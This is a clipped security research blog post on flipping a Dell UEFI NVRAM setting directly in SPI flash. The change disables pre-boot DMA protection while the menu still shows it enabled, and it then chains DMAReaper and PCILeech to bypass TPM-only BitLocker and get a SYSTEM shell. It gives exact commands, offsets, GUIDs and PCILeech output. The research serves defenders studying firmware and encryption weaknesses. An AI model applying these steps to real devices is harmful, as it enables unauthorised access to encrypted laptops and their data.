---
title: Disabling Security Features in a Locked BIOS
source: https://www.mdsec.co.uk/2026/03/disabling-security-features-in-a-locked-bios/
source_host: www.mdsec.co.uk
clip_date: 2026-09-11T10:18:04+08:00
trace_id: 7dc8f850-a2db-4ac4-8a53-e911467536b6
content_hash: e1ed486d44870539137194e7af87d60f9e4fc07460df9a3c5a4e4c3329eba4a4
status: synced
tags:
  - 硬件逆向
  - 漏洞分析
series: null
feed_source: MDSec
ai_summary: 直接改写 SPI Flash 中的 UEFI 镜像，可在界面仍显示"已启用"的同时关闭预启动 DMA/IOMMU 保护，从而突破仅 TPM 的 BitLocker。
ai_summary_style: key-points
images_status:
  total: 12
  succeeded: 12
  failed_urls: []
notion_page_id: 3d875244-d011-81ab-abdc-c15e9b4bf3b2
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 直接改写 SPI Flash 中的 UEFI 镜像，可在界面仍显示"已启用"的同时关闭预启动 DMA/IOMMU 保护，从而突破仅 TPM 的 BitLocker。
> 
> - **获取固件：** 可用 `flashrom -p internal -r dump.bin --ifd -i bios` 读取，或用夹具外接编程器直读 SPI 芯片（回刷必须用后者）。
> - **定位设置项：** UEFITool 搜索 "Setup" 模块 → 提取其 PE32 section body → 用 IFRExtractor 转成 IFR 文本 → `grep -i dma` 找到 "Control Iommu Pre-boot Behavior"：VarStoreId 0x1、VarOffset 0x975、Size 8、Min 0 / Max 1。
> - **定位 NVRAM：** 该 VarStore 对应 GUID `EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9`（Name: Setup），在 NVRAM 中搜索它，Body hex view 跳到 0x975，把 0x01 改成 0x00 即关闭。
> - **静默生效：** 离线改固件回刷后，设置界面仍显示已启用，且不像在 BIOS 界面直接关闭那样要求 BitLocker 恢复密钥；该补丁还能在官方 BIOS 更新（1.32.1）后继续存活。
> - **后续利用与风险：** 用 DMAReaper 覆写 DMAR ACPI 表，再进安全模式用 PCILeech 打补丁取得 `NT AUTHORITY\SYSTEM`；仅 TPM 模式可无凭据突破，TPM+PIN 需已知 PIN 才能提权。刷写有变砖风险，至少取三份 dump 并哈希比对。

## Overview

This post explores how modifying a Dell UEFI firmware image at the flash level can fundamentally undermine platform security without leaving visible traces in the firmware interface. By directly patching the firmware and reflashing it to the chip, it was possible to disable protections designed to mitigate DMA-based attacks while preserving the appearance of a secure configuration – even across official firmware updates.

In this altered state, systems relying on TPM-only BitLocker protection become vulnerable to attacks that can bypass kernel DMA protections and achieve execution as **NT AUTHORITY\\SYSTEM** without requiring user credentials. On devices configured with TPM+PIN, the same approach can be leveraged for privilege escalation when the PIN is known.

For clarity, BIOS and UEFI are used interchangeably across this post.

## Introduction

A [video](https://youtu.be/A5v67H7s0-8?si=Ri2aJgNvM7nQpRQE) was recently brought to my attention of a presentation by Pierre-Nicolas Allard-Coutu on stolen laptops.

His talk discusses how it was possible to achieve full DMA (Direct Memory Access) over PCIe using [PCILeech](https://github.com/ufrisk/pcileech) on a fully protected installation of Windows 11 with TPM-only BitLocker drive encryption.

In summary, it required disabling pre-boot DMA in the UEFI, disabling virtualisation based security using safe mode and corrupting the DMAR ACPI table to prevent IOMMU from working, ultimately disabling Kernel [DMA protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt) without triggering a measured boot that would require the recovery key.

I typically would just use a logic analyser and sniff the VMK (Volume Master Key) as it went across the bus during boot, but this only works if there is a discrete TPM, in situations where the machine makes use of a firmware TPM, fTPM we don’t have that ability so this method provides another way.

While there are now tools and explanations to achieve much of the above, little was mentioned how to modify the UEFI configuration should there be a password preventing you from accessing the setting.

**Just remove the password?**

Many sites, the most famous of which is [badcaps](https://www.badcaps.net/), exist where users paste dumps of their UEFI flash chips and other users patch them to remove the password. This often results in the UEFI entering a factory mode, where there is no password and the user may have to enter their service tag and other unique device details. Effective, but this *might* cause problems with PCR measurements and prevent the BitLocker secured device successfully from booting. If you are interested in this route, I have a tool to patch the UEFI dump [here](https://github.com/craigsblackie/8FC8_Patcher).

What this post intends to do is help in finding where the UEFI stores this configuration in Non-Volatile RAM (NVRAM) and creating a patch to disable pre-boot DMA protection.

Firstly you will need to obtain a dump of your UEFI, you can achieve this in several ways, either by reading the chip directly or using [flashrom](https://flashrom.org/) within Linux and the internal programmer.

For this example, let’s use the internal programmer:

```
flashrom -p internal -r dump.bin --ifd -i bios
```

You can also use an external programmer connected to the chip in circuit using a clip, you will need a setup like this if you intend to flash the modified dump back to the chip:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/463f64c6be58d814.png)

Figure 1 – Cheap clip attached to the SPI Flash chip

After obtaining the BIOS dump, the next step is to locate the firmware module that contains the setup forms. This can be done using UEFITool, a UEFI firmware image viewer and editor.

Open the BIOS dump in UEFITool. The firmware will appear as a tree structure consisting of firmware volumes, files, and sections. Each firmware file typically represents a UEFI driver or application stored inside the BIOS image.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/478381f986b623aa.png)

Most platform configuration options exposed in the BIOS interface are defined inside a module commonly named Setup. To locate it quickly, use the search function in UEFITool and search for the text “Setup”. This will usually highlight a firmware file named *Setup* that contains a PE32 image section, which is the compiled executable responsible for implementing the setup interface.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e34711581e0e4ecf.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/aceac208b96eb9a5.png)

Once the Setup module has been located, expand the file entry until the PE32 image section is visible. Right-click this section and choose *Extract body*. This exports the compiled driver to disk as a binary file.

The extracted PE32 image can then be processed with IFRExtractor. This tool parses the internal IFR (Internal Forms Representation) data stored in the module’s HII package list and converts it into a readable text format. The output describes the BIOS menu structure, including form IDs, variable offsets, and the conditions that control whether specific options are visible.

```sql
# ./Section_PE32_image_Setup_Setup_body.efi
Extracting all UEFI HII form packages using en-US UEFI HII string packages
# ls -la
Permissions Size User Date Modified Name
.rw-r--r--  805k user 10 Mar 17:47   Section_PE32_image_Setup_Setup_body.efi
.rw-r--r--  4.5k user 10 Mar 17:47   Section_PE32_image_Setup_Setup_body.efi.0.0.en-US.uefi.ifr.txt
.rw-r--r--  1.9M user 10 Mar 17:47   Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt
.rw-r--r--  7.3k user 10 Mar 17:47   Section_PE32_image_Setup_Setup_body.efi.2.0.en-US.uefi.ifr.txt
```

I have found it easiest to just grep for keywords such as IOMMU or DMA:

```yaml
# grep -i dma *.txt
Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt:                 OneOf Prompt: "External DMA Allowed On Boot", Help: "External DMA Allowed On Boot for devices such as 1394, PCMCIA, & CardBus", QuestionFlags: 0x10, QuestionId: 0x39, VarStoreId: 0x5, VarOffset: 0x1, Flags: 0x10, Size: 8, Min: 0x0, Max: 0x1, Step: 0x0
Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt:                 OneOf Prompt: "Control Iommu Pre-boot Behavior", Help: "Enable IOMMU in Pre-boot environment (If DMAR table is installed in DXE and If VTD_INFO_PPI is installed in PEI.)", QuestionFlags: 0x14, QuestionId: 0x45F, VarStoreId: 0x1, VarOffset: 0x975, Flags: 0x10, Size: 8, Min: 0x0, Max: 0x1, Step: 0x0
Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt:                 OneOf Prompt: "DMA Control Guarantee", Help: "Enable/Disable DMA_CONTROL_GUARANTEE bit", QuestionFlags: 0x10, QuestionId: 0x461, VarStoreId: 0x2, VarOffset: 0x87, Flags: 0x10, Size: 8, Min: 0x0, Max: 0x1, Step: 0x0
Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt:                         OneOf Prompt: "ITBT DMA0", Help: "Enable/Disable ITBT DMA0", QuestionFlags: 0x10, QuestionId: 0x7BA, VarStoreId: 0x2, VarOffset: 0xC0, Flags: 0x10, Size: 8, Min: 0x0, Max: 0x1, Step: 0x0
Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt:                         OneOf Prompt: "ITBT DMA1", Help: "Enable/Disable ITBT DMA1", QuestionFlags: 0x10, QuestionId: 0x7BB, VarStoreId: 0x2, VarOffset: 0xC1, Flags: 0x10, Size: 8, Min: 0x0, Max: 0x1, Step: 0x0
Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt:         OneOf Prompt: "DMA Enable", Help: "Enabled: UART OS driver will use DMA when possible. Disabled: OS driver will enforce PIO mode", QuestionFlags: 0x10, QuestionId: 0xE36, VarStoreId: 0x5, VarOffset: 0x6F0, Flags: 0x10, Size: 8, Min: 0x0, Max: 0x1, Step: 0x0
Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt:         OneOf Prompt: "DMA Enable", Help: "Enabled: UART OS driver will use DMA when possible. Disabled: OS driver will enforce PIO mode", QuestionFlags: 0x10, QuestionId: 0xE3B, VarStoreId: 0x5, VarOffset: 0x6F1, Flags: 0x10, Size: 8, Min: 0x0, Max: 0x1, Step: 0x0
Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt:         OneOf Prompt: "DMA Enable", Help: "Enabled: UART OS driver will use DMA when possible. Disabled: OS driver will enforce PIO mode", QuestionFlags: 0x10, QuestionId: 0xE40, VarStoreId: 0x5, VarOffset: 0x6F2, Flags: 0x10, Size: 8, Min: 0x0, Max: 0x1, Step: 0x0
```

It looks like the setting we are interested in is “Control Iommu Pre-boot Behavior” which is in the file “ *Section_PE32_image_Setup_Setup_body.efi.1.0.en-US.uefi.ifr.txt* ”. This name does differ from how it is presented in the UEFI, I assume Dell have customised the front-end but this is ultimately the setting we care about.

We now need understand the following information to determine where and how the configuration is stored:

```yaml
VarStoreId: 0x1, VarOffset: 0x975, Flags: 0x10, Size: 8, Min: 0x0, Max: 0x1, Step: 0x0
```

Each field provides information about where the configuration value lives and how it behaves.

***VarStoreId: 0x1***

UEFI setup variables are grouped into structures called variable stores. Each store is assigned an identifier. *VarStoreId: 0x1* means the option belongs to variable store 1, which typically maps to the main setup variable structure (often called Setup). In practice this means the option is stored inside the main BIOS configuration variable saved in NVRAM.

***VarOffset: 0x975***

This indicates the offset of the option within the variable store structure. In this case, the value is located 0x975 bytes from the beginning of the variable store.

***Flags: 0x10***

Flags define how the value should be interpreted. In many firmware implementations 0x10 corresponds to a standard numeric or boolean question type with no special behaviour. The exact meaning can vary slightly depending on the firmware vendor, but generally it indicates a normal configurable field rather than something like a string or buffer.

***Size: 8***

This tells you the storage size of the value. In this case the field occupies 8 bits (1 byte) inside the variable store. Even though the storage space is a byte, the allowed values may still be restricted by the minimum and maximum fields.

***Min: 0x0***

This is the minimum allowed value for the option. Here the lowest valid value is 0.

***Max: 0x1***

This is the maximum allowed value. Since the maximum is 1, the option only supports two states. To find where VarStoreId 0x1 is, we look at the top of the file for the *VarStoreGUID*:

```yaml
VarStoreEfi Guid: 72C5E28C-7783-43A1-8767-FAD73FCCAFA4, VarStoreId: 0x2, Attributes: 0x7, Size: 0x540, Name: "SaSetup"
        VarStoreEfi Guid: 5432122D-D034-49D2-A6DE-65A829EB4C74, VarStoreId: 0x4, Attributes: 0x7, Size: 0x9A, Name: "MeSetup"
        VarStoreEfi Guid: B08F97FF-E6E8-4193-A997-5E9E9B0ADB32, VarStoreId: 0x3, Attributes: 0x7, Size: 0x47B, Name: "CpuSetup"
        VarStoreEfi Guid: 4570B7F1-ADE8-4943-8DC3-406472842384, VarStoreId: 0x5, Attributes: 0x7, Size: 0x92B, Name: "PchSetup"
        VarStoreEfi Guid: AAF8E719-48F8-4099-A6F7-645FBD694C3D, VarStoreId: 0x6, Attributes: 0x7, Size: 0x7, Name: "SiSetup"
        VarStoreEfi Guid: EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9, VarStoreId: 0x1, Attributes: 0x7, Size: 0xD84, Name: "Setup"
        VarStoreEfi Guid: B5FBE0C8-A72A-408D-859C-0FD7537AAA5F, VarStoreId: 0x8, Attributes: 0x3, Size: 0x2A, Name: "LpeSetup"
        VarStoreEfi Guid: 1E785E1A-8EC4-49E4-8275-FBBDEDED18E7, VarStoreId: 0x7, Attributes: 0x7, Size: 0x41, Name: "BoardInfoSetup"
        VarStore Guid: E770BB69-BCB4-4D04-9E97-23FF9456FEAC, VarStoreId: 0xF000, Size: 0x1, Name: "SystemAccess"
        VarStoreEfi Guid: A1D89A3A-4A90-429D-4365-1F64C3A29614, VarStoreId: 0x9, Attributes: 0x7, Size: 0x11, Name: "NhltEndpointsTableConfigurationVariable"
        VarStoreEfi Guid: EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9, VarStoreId: 0xA, Attributes: 0x7, Size: 0x1, Name: "PciBusSetup"
        VarStore Guid: EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9, VarStoreId: 0x100B, Size: 0x6D, Name: "SetupVolatileData"
        VarStore Guid: E59376D7-2DD9-42A3-9EC8-1D71D5E3C1EC, VarStoreId: 0xB, Size: 0x2, Name: "OsProfile"
        VarStore Guid: EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9, VarStoreId: 0x100C, Size: 0x39, Name: "SetupCpuFeatures"
        VarStore Guid: B08F97FF-E6E8-4193-A997-5E9E9B0ADB32, VarStoreId: 0x13BD, Size: 0xB, Name: "CpuSetupVolatileData"
        VarStore Guid: EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9, VarStoreId: 0x13DC, Size: 0x6, Name: "TbtSetupVolatileData"
        VarStore Guid: 5432122D-D034-49D2-A6DE-65A829EB4C74, VarStoreId: 0x1108, Size: 0x12, Name: "MeSetupStorage"
        VarStore Guid: EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9, VarStoreId: 0x155F, Size: 0x4, Name: "DebugSetupVolatileData"
        VarStoreEfi Guid: EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9, VarStoreId: 0xC, Attributes: 0x7, Size: 0x7, Name: "TcgSetup"
        VarStore Guid: 6339D487-26BA-424B-9A5D-687E25D740BC, VarStoreId: 0x1124, Size: 0x1, Name: "TCG2_CONFIGURATION"
        VarStore Guid: 64192DCA-D034-49D2-A6DE-65A829EB4C74, VarStoreId: 0xD, Size: 0x8, Name: "IccAdvancedSetupDataVar"
```

So, we have the VarStoreEfi Guid, EC87D643-EBA4-4BB5-A1E5-3F3E36B20DA9, which is the Setup. We can search for this in UEFITool:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fd93d6b616abd85e.png)

We are looking for this in NVRAM, we scroll down through all the search results in NVRAM until we reach ‘Setup’:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bf9dd3339212746c.png)

We right-click setup and select ‘Body hex view’, then navigate to the offset we identified earlier, 0x975.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/288dd01d4ef79417.png)

At that location, we can see a 0x01, which is expected as we have the setting enabled. Let’s disable the setting, and review this location again, the setting is here in the UEFI:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3ed26426c042ab2e.png)

Now if we dump the UEFI again open this same location in UEFITool again, we see the value is now 0x00

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a433afa503c84caa.png)

With this information, we can easily vibe-code a patcher to find this pattern and disable pre-boot DMA in the flash dump and flash it back, An example has been uploaded to [Github](https://github.com/craigsblackie/Dell_UEFI_Patcher.).

Interestingly, when disabling pre-boot DMA in the UEFI user interface, it would trigger the requirement for the recovery key, however; modifying UEFI offline and flashing back to the SPI flash chip, the UEFI interface would still show the option as enabled, but it was possible to get DMA, whilst also successfully booting to the Windows Login Screen.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/14c278324628383a.png)

This patch also survived an official Dell BIOS update to the latest version available at the time of writing (1.32.1).

With DMA now possible within the UEFI, we can now overwrite the DMAR ACPI table with [DMAReaper](https://github.com/PN-Tester/DMAReaper):

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/afb10542b5c27e8c.png)

Then boot into Safe mode and use PCILeech to get a shell as **NT AUTHORITY\\SYSTEM**:

```yaml
# sudo ./pcileech patch -sig stickykeys_cmd_win

[+] using FTDI device: 0403:601f (bus 2, device 50)
[+] FTDIFTDI SuperSpeed-FIFO Bridge000000000001
 Current Action: Patching
 Access Mode:    Normal
 Progress:       4208 / 10252 (41%)
 Speed:          210 MB/s
 Address:        0x0000000107000000
 Pages read:     520096 / 2624512 (19%)
 Pages failed:   557152 (21%)
Patch: Successful. Location: 0x106715b9f
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c2d186846e691a21.jpg)

It should come with a heavy warning that flashing your UEFI comes with serious risk and you could end up bricking your system. Always take three dumps minimum, hash them and ensure they match. This post comes with no assurances that this will work for you.

References:

-   [https://en4rab.github.io/posts/UEFI-settings](https://en4rab.github.io/posts/UEFI-settings)

This post was written by [Craig S. Blackie](https://x.com/craigsblackie).

The post [Disabling Security Features in a Locked BIOS](https://www.mdsec.co.uk/2026/03/disabling-security-features-in-a-locked-bios/) appeared first on [MDSec](https://www.mdsec.co.uk/).
